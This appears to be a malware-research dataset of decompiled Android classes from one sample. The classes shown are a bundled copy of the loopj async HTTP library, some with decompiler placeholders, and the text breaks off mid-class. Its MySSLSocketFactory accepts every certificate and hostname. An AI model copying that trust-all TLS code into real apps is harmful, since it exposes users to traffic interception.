"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\InflatingEntity.code","class InflatingEntity extends HttpEntityWrapper {   GZIPInputStream gzippedStream;   PushbackInputStream pushbackStream;   InputStream wrappedStream;   public InflatingEntity(  HttpEntity httpEntity){     super(httpEntity);   }   @Override public void consumeContent(){     AsyncHttpClient.silentCloseInputStream(this.wrappedStream);     AsyncHttpClient.silentCloseInputStream(this.pushbackStream);     AsyncHttpClient.silentCloseInputStream(this.gzippedStream);     super.consumeContent();   }   @Override public InputStream getContent(){     this.wrappedStream=this.wrappedEntity.getContent();     this.pushbackStream=new PushbackInputStream(this.wrappedStream,2);     if (!AsyncHttpClient.isInputStreamGZIPCompressed(this.pushbackStream)) {       return this.pushbackStream;     }     this.gzippedStream=new GZIPInputStream(this.pushbackStream);     return this.gzippedStream;   }   @Override public long getContentLength(){     return -1L;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\JsonHttpResponseHandler.code","public class JsonHttpResponseHandler extends TextHttpResponseHandler {   private static final String LOG_TAG=""JsonHttpResponseHandler"";   public JsonHttpResponseHandler(){     super(AsyncHttpResponseHandler.DEFAULT_CHARSET);   }   public JsonHttpResponseHandler(  String str){     super(str);   }   @Override public void onFailure(  int i,  Header[] headerArr,  String str,  Throwable th){     Log.w(LOG_TAG,""onFailure(int, Header[], String, Throwable) was not overriden, but callback was received"",th);   }   public void onFailure(  int i,  Header[] headerArr,  Throwable th,  JSONArray jSONArray){     Log.w(LOG_TAG,""onFailure(int, Header[], Throwable, JSONArray) was not overriden, but callback was received"",th);   }   public void onFailure(  int i,  Header[] headerArr,  Throwable th,  JSONObject jSONObject){     Log.w(LOG_TAG,""onFailure(int, Header[], Throwable, JSONObject) was not overriden, but callback was received"",th);   }   @Override public final void onFailure(  final int i,  final Header[] headerArr,  final byte[] bArr,  final Throwable th){     if (bArr == null) {       Log.v(LOG_TAG,""response body is null, calling onFailure(Throwable, JSONObject)"");       onFailure(i,headerArr,th,(JSONObject)null);       return;     }     Runnable runnable=new Runnable(){       @Override public void run(){         try {           final Object parseResponse=JsonHttpResponseHandler.this.parseResponse(bArr);           JsonHttpResponseHandler.this.postRunnable(new Runnable(){             @Override public void run(){               if (parseResponse instanceof JSONObject) {                 JsonHttpResponseHandler.this.onFailure(i,headerArr,th,(JSONObject)parseResponse);                 return;               }               if (parseResponse instanceof JSONArray) {                 JsonHttpResponseHandler.this.onFailure(i,headerArr,th,(JSONArray)parseResponse);               }  else               if (parseResponse instanceof String) {                 JsonHttpResponseHandler.this.onFailure(i,headerArr,(String)parseResponse,th);               }  else {                 JsonHttpResponseHandler.this.onFailure(i,headerArr,new JSONException(""Unexpected response type "" + parseResponse.getClass().getName()),(JSONObject)null);               }             }           } );         }  catch (        JSONException e) {           JsonHttpResponseHandler.this.postRunnable(new Runnable(){             @Override public void run(){               JsonHttpResponseHandler.this.onFailure(i,headerArr,e,(JSONObject)null);             }           } );         }       }     } ;     if (getUseSynchronousMode()) {       runnable.run();     }  else {       new Thread(runnable).start();     }   }   @Override public void onSuccess(  int i,  Header[] headerArr,  String str){     Log.w(LOG_TAG,""onSuccess(int, Header[], String) was not overriden, but callback was received"");   }   public void onSuccess(  int i,  Header[] headerArr,  JSONArray jSONArray){     Log.w(LOG_TAG,""onSuccess(int, Header[], JSONArray) was not overriden, but callback was received"");   }   public void onSuccess(  int i,  Header[] headerArr,  JSONObject jSONObject){     Log.w(LOG_TAG,""onSuccess(int, Header[], JSONObject) was not overriden, but callback was received"");   }   @Override public final void onSuccess(  final int i,  final Header[] headerArr,  final byte[] bArr){     if (i == 204) {       onSuccess(i,headerArr,new JSONObject());       return;     }     Runnable runnable=new Runnable(){       @Override public void run(){         try {           final Object parseResponse=JsonHttpResponseHandler.this.parseResponse(bArr);           JsonHttpResponseHandler.this.postRunnable(new Runnable(){             @Override public void run(){               if (parseResponse instanceof JSONObject) {                 JsonHttpResponseHandler.this.onSuccess(i,headerArr,(JSONObject)parseResponse);                 return;               }               if (parseResponse instanceof JSONArray) {                 JsonHttpResponseHandler.this.onSuccess(i,headerArr,(JSONArray)parseResponse);               }  else               if (parseResponse instanceof String) {                 JsonHttpResponseHandler.this.onFailure(i,headerArr,(String)parseResponse,new JSONException(""Response cannot be parsed as JSON data""));               }  else {                 JsonHttpResponseHandler.this.onFailure(i,headerArr,new JSONException(""Unexpected response type "" + parseResponse.getClass().getName()),(JSONObject)null);               }             }           } );         }  catch (        JSONException e) {           JsonHttpResponseHandler.this.postRunnable(new Runnable(){             @Override public void run(){               JsonHttpResponseHandler.this.onFailure(i,headerArr,e,(JSONObject)null);             }           } );         }       }     } ;     if (getUseSynchronousMode()) {       runnable.run();     }  else {       new Thread(runnable).start();     }   }   protected java.lang.Object parseResponse(  byte[] r5){     throw new UnsupportedOperationException(""Method not decompiled: com.fw.tzthree.com.loopj.android.http.JsonHttpResponseHandler.parseResponse(byte[]):java.lang.Object"");   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\JsonStreamerEntity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5f595e8f"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\MyRedirectHandler.code","!org.eclipse.jdt.core.dom.TypeDeclaration@66f5c40d"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\MySSLSocketFactory.code","public class MySSLSocketFactory extends SSLSocketFactory {   SSLContext sslContext;   public MySSLSocketFactory(  KeyStore keyStore){     super(keyStore);     this.sslContext=SSLContext.getInstance(""TLS"");     this.sslContext.init(null,new TrustManager[]{new X509TrustManager(){       @Override public void checkClientTrusted(      X509Certificate[] x509CertificateArr,      String str){       }       @Override public void checkServerTrusted(      X509Certificate[] x509CertificateArr,      String str){       }       @Override public X509Certificate[] getAcceptedIssuers(){         return null;       }     } },null);   }   public static SSLSocketFactory getFixedSocketFactory(){     try {       MySSLSocketFactory mySSLSocketFactory=new MySSLSocketFactory(getKeystore());       mySSLSocketFactory.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);       return mySSLSocketFactory;     }  catch (    Throwable th) {       th.printStackTrace();       return SSLSocketFactory.getSocketFactory();     }   }   public static KeyStore getKeystore(){     KeyStore keyStore;     Throwable th;     try {       keyStore=KeyStore.getInstance(KeyStore.getDefaultType());     }  catch (    Throwable th2) {       keyStore=null;       th=th2;     }     try {       keyStore.load(null,null);     }  catch (    Throwable th3) {       th=th3;       th.printStackTrace();       return keyStore;     }     return keyStore;   }   public static java.security.KeyStore getKeystoreOfCA(  java.io.InputStream r5){     throw new UnsupportedOperationException(""Method not decompiled: com.fw.tzthree.com.loopj.android.http.MySSLSocketFactory.getKeystoreOfCA(java.io.InputStream):java.security.KeyStore"");   }   public static DefaultHttpClient getNewHttpClient(  KeyStore keyStore){     try {       MySSLSocketFactory mySSLSocketFactory=new MySSLSocketFactory(keyStore);       SchemeRegistry schemeRegistry=new SchemeRegistry();       schemeRegistry.register(new Scheme(""http"",PlainSocketFactory.getSocketFactory(),80));       schemeRegistry.register(new Scheme(""https"",mySSLSocketFactory,443));       BasicHttpParams basicHttpParams=new BasicHttpParams();       HttpProtocolParams.setVersion(basicHttpParams,HttpVersion.HTTP_1_1);       HttpProtocolParams.setContentCharset(basicHttpParams,AsyncHttpResponseHandler.DEFAULT_CHARSET);       return new DefaultHttpClient(new ThreadSafeClientConnManager(basicHttpParams,schemeRegistry),basicHttpParams);     }  catch (    Exception e) {       return new DefaultHttpClient();     }   }   @Override public Socket createSocket(){     return this.sslContext.getSocketFactory().createSocket();   }   @Override public Socket createSocket(  Socket socket,  String str,  int i,  boolean z){     return this.sslContext.getSocketFactory().createSocket(socket,str,i,z);   }   public void fixHttpsURLConnection(){     HttpsURLConnection.setDefaultSSLSocketFactory(this.sslContext.getSocketFactory());   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\PersistentCookieStore.code","public class PersistentCookieStore implements CookieStore {   private static final String COOKIE_NAME_PREFIX=""cookie_"";   private static final String COOKIE_NAME_STORE=""names"";   private static final String COOKIE_PREFS=""CookiePrefsFile"";   private static final String LOG_TAG=""PersistentCookieStore"";   private final SharedPreferences cookiePrefs;   private boolean omitNonPersistentCookies=false;   private final ConcurrentHashMap<String,Cookie> cookies=new ConcurrentHashMap<>();   public PersistentCookieStore(  Context context){     Cookie decodeCookie;     this.cookiePrefs=context.getSharedPreferences(COOKIE_PREFS,0);     String string=this.cookiePrefs.getString(COOKIE_NAME_STORE,null);     if (string != null) {       for (      String str : TextUtils.split(string,"","")) {         String string2=this.cookiePrefs.getString(COOKIE_NAME_PREFIX + str,null);         if (string2 != null && (decodeCookie=decodeCookie(string2)) != null) {           this.cookies.put(str,decodeCookie);         }       }       clearExpired(new Date());     }   }   @Override public void addCookie(  Cookie cookie){     if (!this.omitNonPersistentCookies || cookie.isPersistent()) {       String str=cookie.getName() + cookie.getDomain();       if (cookie.isExpired(new Date())) {         this.cookies.remove(str);       }  else {         this.cookies.put(str,cookie);       }       SharedPreferences.Editor edit=this.cookiePrefs.edit();       edit.putString(COOKIE_NAME_STORE,TextUtils.join("","",this.cookies.keySet()));       edit.putString(COOKIE_NAME_PREFIX + str,encodeCookie(new SerializableCookie(cookie)));       edit.commit();     }   }   protected String byteArrayToHexString(  byte[] bArr){     StringBuilder sb=new StringBuilder(bArr.length * 2);     for (    byte b : bArr) {       int i=b & 255;       if (i < 16) {         sb.append('0');       }       sb.append(Integer.toHexString(i));     }     return sb.toString().toUpperCase(Locale.US);   }   @Override public void clear(){     SharedPreferences.Editor edit=this.cookiePrefs.edit();     Iterator<String> it=this.cookies.keySet().iterator();     while (it.hasNext()) {       edit.remove(COOKIE_NAME_PREFIX + it.next());     }     edit.remove(COOKIE_NAME_STORE);     edit.commit();     this.cookies.clear();   }   @Override public boolean clearExpired(  Date date){     boolean z;     boolean z2=false;     SharedPreferences.Editor edit=this.cookiePrefs.edit();     Iterator<Map.Entry<String,Cookie>> it=this.cookies.entrySet().iterator();     while (true) {       z=z2;       if (!it.hasNext()) {         break;       }       Map.Entry<String,Cookie> next=it.next();       String key=next.getKey();       if (next.getValue().isExpired(date)) {         this.cookies.remove(key);         edit.remove(COOKIE_NAME_PREFIX + key);         z2=true;       }  else {         z2=z;       }     }     if (z) {       edit.putString(COOKIE_NAME_STORE,TextUtils.join("","",this.cookies.keySet()));     }     edit.commit();     return z;   }   protected Cookie decodeCookie(  String str){     try {       return ((SerializableCookie)new ObjectInputStream(new ByteArrayInputStream(hexStringToByteArray(str))).readObject()).getCookie();     }  catch (    IOException e) {       Log.d(LOG_TAG,""IOException in decodeCookie"",e);       return null;     } catch (    ClassNotFoundException e2) {       Log.d(LOG_TAG,""ClassNotFoundException in decodeCookie"",e2);       return null;     }   }   public void deleteCookie(  Cookie cookie){     String str=cookie.getName() + cookie.getDomain();     this.cookies.remove(str);     SharedPreferences.Editor edit=this.cookiePrefs.edit();     edit.remove(COOKIE_NAME_PREFIX + str);     edit.commit();   }   protected String encodeCookie(  SerializableCookie serializableCookie){     if (serializableCookie == null) {       return null;     }     ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();     try {       new ObjectOutputStream(byteArrayOutputStream).writeObject(serializableCookie);       return byteArrayToHexString(byteArrayOutputStream.toByteArray());     }  catch (    IOException e) {       Log.d(LOG_TAG,""IOException in encodeCookie"",e);       return null;     }   }   @Override public List<Cookie> getCookies(){     return new ArrayList(this.cookies.values());   }   protected byte[] hexStringToByteArray(  String str){     int length=str.length();     byte[] bArr=new byte[length / 2];     for (int i=0; i < length; i+=2) {       bArr[i / 2]=(byte)((Character.digit(str.charAt(i),16) << 4) + Character.digit(str.charAt(i + 1),16));     }     return bArr;   }   public void setOmitNonPersistentCookies(  boolean z){     this.omitNonPersistentCookies=z;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\PreemtiveAuthorizationHttpRequestInterceptor.code","public class PreemtiveAuthorizationHttpRequestInterceptor implements HttpRequestInterceptor {   @Override public void process(  HttpRequest httpRequest,  HttpContext httpContext){     Credentials credentials;     AuthState authState=(AuthState)httpContext.getAttribute(""http.auth.target-scope"");     CredentialsProvider credentialsProvider=(CredentialsProvider)httpContext.getAttribute(""http.auth.credentials-provider"");     HttpHost httpHost=(HttpHost)httpContext.getAttribute(""http.target_host"");     if (authState.getAuthScheme() != null || (credentials=credentialsProvider.getCredentials(new AuthScope(httpHost.getHostName(),httpHost.getPort()))) == null) {       return;     }     authState.setAuthScheme(new BasicScheme());     authState.setCredentials(credentials);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\RangeFileAsyncHttpResponseHandler.code","public abstract class RangeFileAsyncHttpResponseHandler extends FileAsyncHttpResponseHandler {   private static final String LOG_TAG=""RangeFileAsyncHttpResponseHandler"";   private boolean append;   private long current;   public RangeFileAsyncHttpResponseHandler(  File file){     super(file);     this.current=0L;     this.append=false;   }   @Override protected byte[] getResponseData(  HttpEntity httpEntity){     int read;     if (httpEntity == null) {       return null;     }     InputStream content=httpEntity.getContent();     long contentLength=httpEntity.getContentLength() + this.current;     FileOutputStream fileOutputStream=new FileOutputStream(getTargetFile(),this.append);     if (content == null) {       return null;     }     try {       byte[] bArr=new byte[4096];       while (this.current < contentLength && (read=content.read(bArr)) != -1 && !Thread.currentThread().isInterrupted()) {         this.current+=read;         fileOutputStream.write(bArr,0,read);         sendProgressMessage((int)this.current,(int)contentLength);       }       return null;     }   finally {       content.close();       fileOutputStream.flush();       fileOutputStream.close();     }   }   @Override public void sendResponseMessage(  HttpResponse httpResponse){     if (Thread.currentThread().isInterrupted()) {       return;     }     StatusLine statusLine=httpResponse.getStatusLine();     if (statusLine.getStatusCode() == 416) {       if (Thread.currentThread().isInterrupted()) {         return;       }       sendSuccessMessage(statusLine.getStatusCode(),httpResponse.getAllHeaders(),null);     }  else     if (statusLine.getStatusCode() >= 300) {       if (Thread.currentThread().isInterrupted()) {         return;       }       sendFailureMessage(statusLine.getStatusCode(),httpResponse.getAllHeaders(),null,new HttpResponseException(statusLine.getStatusCode(),statusLine.getReasonPhrase()));     }  else {       if (Thread.currentThread().isInterrupted()) {         return;       }       Header firstHeader=httpResponse.getFirstHeader(AsyncHttpClient.HEADER_CONTENT_RANGE);       if (firstHeader == null) {         this.append=false;         this.current=0L;       }  else {         Log.v(LOG_TAG,""Content-Range: "" + firstHeader.getValue());       }       sendSuccessMessage(statusLine.getStatusCode(),httpResponse.getAllHeaders(),getResponseData(httpResponse.getEntity()));     }   }   public void updateRequestHeaders(  HttpUriRequest httpUriRequest){     if (this.mFile.exists() && this.mFile.canWrite()) {       this.current=this.mFile.length();     }     if (this.current > 0) {       this.append=true;       httpUriRequest.setHeader(""Range"",""bytes="" + this.current + ""-"");     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\RequestHandle.code","public class RequestHandle {   private final WeakReference<AsyncHttpRequest> request;   public RequestHandle(  AsyncHttpRequest asyncHttpRequest){     this.request=new WeakReference<>(asyncHttpRequest);   }   public boolean cancel(  boolean z){     AsyncHttpRequest asyncHttpRequest=this.request.get();     return asyncHttpRequest == null || asyncHttpRequest.cancel(z);   }   public boolean isCancelled(){     AsyncHttpRequest asyncHttpRequest=this.request.get();     return asyncHttpRequest == null || asyncHttpRequest.isCancelled();   }   public boolean isFinished(){     AsyncHttpRequest asyncHttpRequest=this.request.get();     return asyncHttpRequest == null || asyncHttpRequest.isDone();   }   public boolean shouldBeGarbageCollected(){     boolean z=isCancelled() || isFinished();     if (z) {       this.request.clear();     }     return z;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\RequestParams.code","public class RequestParams {   public static final String APPLICATION_JSON=""application/json"";   public static final String APPLICATION_OCTET_STREAM=""application/octet-stream"";   protected static final String LOG_TAG=""RequestParams"";   protected boolean autoCloseInputStreams;   protected String contentEncoding;   protected final ConcurrentHashMap<String,FileWrapper> fileParams;   protected boolean isRepeatable;   protected final ConcurrentHashMap<String,StreamWrapper> streamParams;   protected final ConcurrentHashMap<String,String> urlParams;   protected final ConcurrentHashMap<String,Object> urlParamsWithObjects;   protected boolean useJsonStreamer; public class FileWrapper {     public final String contentType;     public final File file;     public FileWrapper(    File file,    String str){       this.file=file;       this.contentType=str;     }   } public class StreamWrapper {     public final boolean autoClose;     public final String contentType;     public final InputStream inputStream;     public final String name;     public StreamWrapper(    InputStream inputStream,    String str,    String str2,    boolean z){       this.inputStream=inputStream;       this.name=str;       this.contentType=str2;       this.autoClose=z;     }     static StreamWrapper newInstance(    InputStream inputStream,    String str,    String str2,    boolean z){       if (str2 == null) {         str2=RequestParams.APPLICATION_OCTET_STREAM;       }       return new StreamWrapper(inputStream,str,str2,z);     }   }   public RequestParams(){     this((Map<String,String>)null);   }   public RequestParams(  final String str,  final String str2){     this(new HashMap<String,String>(){ {         put(str,str2);       }     } );   }   public RequestParams(  Map<String,String> map){     this.urlParams=new ConcurrentHashMap<>();     this.streamParams=new ConcurrentHashMap<>();     this.fileParams=new ConcurrentHashMap<>();     this.urlParamsWithObjects=new ConcurrentHashMap<>();     this.contentEncoding=AsyncHttpResponseHandler.DEFAULT_CHARSET;     if (map != null) {       for (      Map.Entry<String,String> entry : map.entrySet()) {         put(entry.getKey(),entry.getValue());       }     }   }   public RequestParams(  Object... objArr){     this.urlParams=new ConcurrentHashMap<>();     this.streamParams=new ConcurrentHashMap<>();     this.fileParams=new ConcurrentHashMap<>();     this.urlParamsWithObjects=new ConcurrentHashMap<>();     this.contentEncoding=AsyncHttpResponseHandler.DEFAULT_CHARSET;     int length=objArr.length;     if (length % 2 != 0) {       throw new IllegalArgumentException(""Supplied arguments must be even"");     }     for (int i=0; i < length; i+=2) {       put(String.valueOf(objArr[i]),String.valueOf(objArr[i + 1]));     }   }   private HttpEntity createFormEntity(){     try {       return new UrlEncodedFormEntity(getParamsList(),this.contentEncoding);     }  catch (    UnsupportedEncodingException e) {       Log.e(LOG_TAG,""createFormEntity failed"",e);       return null;     }   }   private HttpEntity createJsonStreamerEntity(  ResponseHandlerInterface responseHandlerInterface){     JsonStreamerEntity jsonStreamerEntity=new JsonStreamerEntity(responseHandlerInterface,(this.fileParams.isEmpty() && this.streamParams.isEmpty()) ? false : true);     for (    Map.Entry<String,String> entry : this.urlParams.entrySet()) {       jsonStreamerEntity.addPart(entry.getKey(),entry.getValue());     }     for (    Map.Entry<String,Object> entry2 : this.urlParamsWithObjects.entrySet()) {       jsonStreamerEntity.addPart(entry2.getKey(),entry2.getValue());     }     for (    Map.Entry<String,FileWrapper> entry3 : this.fileParams.entrySet()) {       jsonStreamerEntity.addPart(entry3.getKey(),entry3.getValue());     }     for (    Map.Entry<String,StreamWrapper> entry4 : this.streamParams.entrySet()) {       StreamWrapper value=entry4.getValue();       if (value.inputStream != null) {         jsonStreamerEntity.addPart(entry4.getKey(),StreamWrapper.newInstance(value.inputStream,value.name,value.contentType,value.autoClose));       }     }     return jsonStreamerEntity;   }   private HttpEntity createMultipartEntity(  ResponseHandlerInterface responseHandlerInterface){     SimpleMultipartEntity simpleMultipartEntity=new SimpleMultipartEntity(responseHandlerInterface);     simpleMultipartEntity.setIsRepeatable(this.isRepeatable);     for (    Map.Entry<String,String> entry : this.urlParams.entrySet()) {       simpleMultipartEntity.addPartWithCharset(entry.getKey(),entry.getValue(),this.contentEncoding);     }     for (    BasicNameValuePair basicNameValuePair : getParamsList(null,this.urlParamsWithObjects)) {       simpleMultipartEntity.addPartWithCharset(basicNameValuePair.getName(),basicNameValuePair.getValue(),this.contentEncoding);     }     for (    Map.Entry<String,StreamWrapper> entry2 : this.streamParams.entrySet()) {       StreamWrapper value=entry2.getValue();       if (value.inputStream != null) {         simpleMultipartEntity.addPart(entry2.getKey(),value.name,value.inputStream,value.contentType);       }     }     for (    Map.Entry<String,FileWrapper> entry3 : this.fileParams.entrySet()) {       FileWrapper value2=entry3.getValue();       simpleMultipartEntity.addPart(entry3.getKey(),value2.file,value2.contentType);     }     return simpleMultipartEntity;   }   private List<BasicNameValuePair> getParamsList(  String str,  Object obj){     Object obj2;     LinkedList linkedList=new LinkedList();     if (obj instanceof Map) {       Map map=(Map)obj;       ArrayList arrayList=new ArrayList(map.keySet());       if (arrayList.size() > 0 && (arrayList.get(0) instanceof Comparable)) {         Collections.sort(arrayList);       }       for (      Object obj3 : arrayList) {         if ((obj3 instanceof String) && (obj2=map.get(obj3)) != null) {           linkedList.addAll(getParamsList(str == null ? (String)obj3 : String.format(""%s[%s]"",str,obj3),obj2));         }       }     }  else     if (obj instanceof List) {       List list=(List)obj;       int size=list.size();       for (int i=0; i < size; i++) {         linkedList.addAll(getParamsList(String.format(""%s[%d]"",str,Integer.valueOf(i)),list.get(i)));       }     }  else     if (obj instanceof Object[]) {       Object[] objArr=(Object[])obj;       int length=objArr.length;       for (int i2=0; i2 < length; i2++) {         linkedList.addAll(getParamsList(String.format(""%s[%d]"",str,Integer.valueOf(i2)),objArr[i2]));       }     }  else     if (obj instanceof Set) {       Iterator it=((Set)obj).iterator();       while (it.hasNext()) {         linkedList.addAll(getParamsList(str,it.next()));       }     }  else {       linkedList.add(new BasicNameValuePair(str,obj.toString()));     }     return linkedList;   }   public void add(  String str,  String str2){     if (str == null || str2 == null) {       return;     }     Object obj=this.urlParamsWithObjects.get(str);     if (obj == null) {       obj=new HashSet();       put(str,obj);     }     if (obj instanceof List) {       ((List)obj).add(str2);     }  else     if (obj instanceof Set) {       ((Set)obj).add(str2);     }   }   public HttpEntity getEntity(  ResponseHandlerInterface responseHandlerInterface){     return this.useJsonStreamer ? createJsonStreamerEntity(responseHandlerInterface) : (this.streamParams.isEmpty() && this.fileParams.isEmpty()) ? createFormEntity() : createMultipartEntity(responseHandlerInterface);   }   public String getParamString(){     return URLEncodedUtils.format(getParamsList(),this.contentEncoding);   }   protected List<BasicNameValuePair> getParamsList(){     LinkedList linkedList=new LinkedList();     for (    Map.Entry<String,String> entry : this.urlParams.entrySet()) {       linkedList.add(new BasicNameValuePair(entry.getKey(),entry.getValue()));     }     linkedList.addAll(getParamsList(null,this.urlParamsWithObjects));     return linkedList;   }   public boolean has(  String str){     return (this.urlParams.get(str) == null && this.streamParams.get(str) == null && this.fileParams.get(str) == null && this.urlParamsWithObjects.get(str) == null) ? false : true;   }   public void put(  String str,  int i){     if (str != null) {       this.urlParams.put(str,String.valueOf(i));     }   }   public void put(  String str,  long j){     if (str != null) {       this.urlParams.put(str,String.valueOf(j));     }   }   public void put(  String str,  File file){     put(str,file,(String)null);   }   public void put(  String str,  File file,  String str2){     if (file == null || !file.exists()) {       throw new FileNotFoundException();     }     if (str != null) {       this.fileParams.put(str,new FileWrapper(file,str2));     }   }   public void put(  String str,  InputStream inputStream){     put(str,inputStream,(String)null);   }   public void put(  String str,  InputStream inputStream,  String str2){     put(str,inputStream,str2,null);   }   public void put(  String str,  InputStream inputStream,  String str2,  String str3){     put(str,inputStream,str2,str3,this.autoCloseInputStreams);   }   public void put(  String str,  InputStream inputStream,  String str2,  String str3,  boolean z){     if (str == null || inputStream == null) {       return;     }     this.streamParams.put(str,StreamWrapper.newInstance(inputStream,str2,str3,z));   }   public void put(  String str,  Object obj){     if (str == null || obj == null) {       return;     }     this.urlParamsWithObjects.put(str,obj);   }   public void put(  String str,  String str2){     if (str == null || str2 == null) {       return;     }     this.urlParams.put(str,str2);   }   public void remove(  String str){     this.urlParams.remove(str);     this.streamParams.remove(str);     this.fileParams.remove(str);     this.urlParamsWithObjects.remove(str);   }   public void setAutoCloseInputStreams(  boolean z){     this.autoCloseInputStreams=z;   }   public void setContentEncoding(  String str){     if (str != null) {       this.contentEncoding=str;     }  else {       Log.d(LOG_TAG,""setContentEncoding called with null attribute"");     }   }   public void setHttpEntityIsRepeatable(  boolean z){     this.isRepeatable=z;   }   public void setUseJsonStreamer(  boolean z){     this.useJsonStreamer=z;   }   public String toString(){     StringBuilder sb=new StringBuilder();     for (    Map.Entry<String,String> entry : this.urlParams.entrySet()) {       if (sb.length() > 0) {         sb.append(""&"");       }       sb.append(entry.getKey());       sb.append(""="");       sb.append(entry.getValue());     }     for (    Map.Entry<String,StreamWrapper> entry2 : this.streamParams.entrySet()) {       if (sb.length() > 0) {         sb.append(""&"");       }       sb.append(entry2.getKey());       sb.append(""="");       sb.append(""STREAM"");     }     for (    Map.Entry<String,FileWrapper> entry3 : this.fileParams.entrySet()) {       if (sb.length() > 0) {         sb.append(""&"");       }       sb.append(entry3.getKey());       sb.append(""="");       sb.append(""FILE"");     }     for (    BasicNameValuePair basicNameValuePair : getParamsList(null,this.urlParamsWithObjects)) {       if (sb.length() > 0) {         sb.append(""&"");       }       sb.append(basicNameValuePair.getName());       sb.append(""="");       sb.append(basicNameValuePair.getValue());     }     return sb.toString();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\ResponderHandler.code","public class ResponderHandler extends Handler {   private final AsyncHttpResponseHandler mResponder;   ResponderHandler(  AsyncHttpResponseHandler asyncHttpResponseHandler){     this.mResponder=asyncHttpResponseHandler;   }   @Override public void handleMessage(  Message message){     this.mResponder.handleMessage(message);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\ResponseHandlerInterface.code","public interface ResponseHandlerInterface {   Header[] getRequestHeaders();   URI getRequestURI();   boolean getUseSynchronousMode();   void sendCancelMessage();   void sendFailureMessage(  int i,  Header[] headerArr,  byte[] bArr,  Throwable th);   void sendFinishMessage();   void sendProgressMessage(  int i,  int i2);   void sendResponseMessage(  HttpResponse httpResponse);   void sendRetryMessage(  int i);   void sendStartMessage();   void sendSuccessMessage(  int i,  Header[] headerArr,  byte[] bArr);   void setRequestHeaders(  Header[] headerArr);   void setRequestURI(  URI uri);   void setUseSynchronousMode(  boolean z); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\RetryHandler.code","class RetryHandler implements HttpRequestRetryHandler {   private final int maxRetries;   private final int retrySleepTimeMS;   private static final HashSet<Class<?>> exceptionWhitelist=new HashSet<>();   private static final HashSet<Class<?>> exceptionBlacklist=new HashSet<>(); static {     exceptionWhitelist.add(NoHttpResponseException.class);     exceptionWhitelist.add(UnknownHostException.class);     exceptionWhitelist.add(SocketException.class);     exceptionBlacklist.add(InterruptedIOException.class);     exceptionBlacklist.add(SSLException.class);   }   public RetryHandler(  int i,  int i2){     this.maxRetries=i;     this.retrySleepTimeMS=i2;   }   public static void addClassToBlacklist(  Class<?> cls){     exceptionBlacklist.add(cls);   }   public static void addClassToWhitelist(  Class<?> cls){     exceptionWhitelist.add(cls);   }   protected boolean isInList(  HashSet<Class<?>> hashSet,  Throwable th){     Iterator<Class<?>> it=hashSet.iterator();     while (it.hasNext()) {       if (it.next().isInstance(th)) {         return true;       }     }     return false;   }   @Override public boolean retryRequest(  IOException iOException,  int i,  HttpContext httpContext){     boolean z=true;     Boolean bool=(Boolean)httpContext.getAttribute(""http.request_sent"");     boolean z2=bool != null && bool.booleanValue();     if (i > this.maxRetries) {       z=false;     }  else     if (!isInList(exceptionWhitelist,iOException)) {       if (isInList(exceptionBlacklist,iOException)) {         z=false;       }  else       if (!z2) {       }     }     if (z && ((HttpUriRequest)httpContext.getAttribute(""http.request"")) == null) {       return false;     }     if (z) {       SystemClock.sleep(this.retrySleepTimeMS);     }  else {       iOException.printStackTrace();     }     return z;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.loopj.android.http\SaxAsyncHttpResponseHandler.code","public abstract class SaxAsyncHttpResponseHandler<T extends DefaultHandler> extends AsyncHttpResponseHandler {   private static final String LOG_TAG=""SaxAsyncHttpResponseHandler"";   private T handler;   public SaxAsyncHttpResponseHandler(  T t){     this.handler=null;     if (t == null) {       throw new Error(""null instance of <T extends DefaultHandler> passed to constructor"");     }     this.handler=t;   }   @Override protected byte[] getResponseData(  HttpEntity httpEntity){     InputStreamReader inputStreamReader;     if (httpEntity != null) {       InputStream content=httpEntity.getContent();       try {         if (content != null) {           try {             XMLReader xMLReader=SAXParserFactory.newInstance().newSAXParser().getXMLReader();             xMLReader.setContentHandler(this.handler);             inputStreamReader=new InputStreamReader(content,AsyncHttpResponseHandler.DEFAULT_CHARSET);             try {               xMLReader.parse(new InputSource(inputStreamReader));               AsyncHttpClient.silentCloseInputStream(content);               if (inputStreamReader != null) {                 try {                   inputStreamReader.close();         